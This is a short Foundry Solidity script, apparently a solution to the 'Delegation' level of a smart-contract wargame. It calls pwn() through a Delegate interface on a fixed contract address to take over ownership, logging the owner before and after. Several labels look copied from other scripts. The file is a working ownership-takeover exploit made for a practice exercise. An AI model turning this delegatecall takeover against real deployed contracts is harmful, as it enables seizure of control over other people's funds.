// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Delegate} from "../src/Delegation.sol";

contract ForceSolution is Script {
    Delegate public delegate;

    function run() external {
        vm.startBroadcast();

        console.log("Solving Delegate...");

        delegate = Delegate(0x020FCAeb900Ff7a6cEB02fC024f3E5eCf236f023);

        console.log("Locked: ", delegate.owner());
        delegate.pwn();
        console.log("Locked: ", delegate.owner());

        vm.stopBroadcast();
        console.log("Delegate Solved!");
    }
}
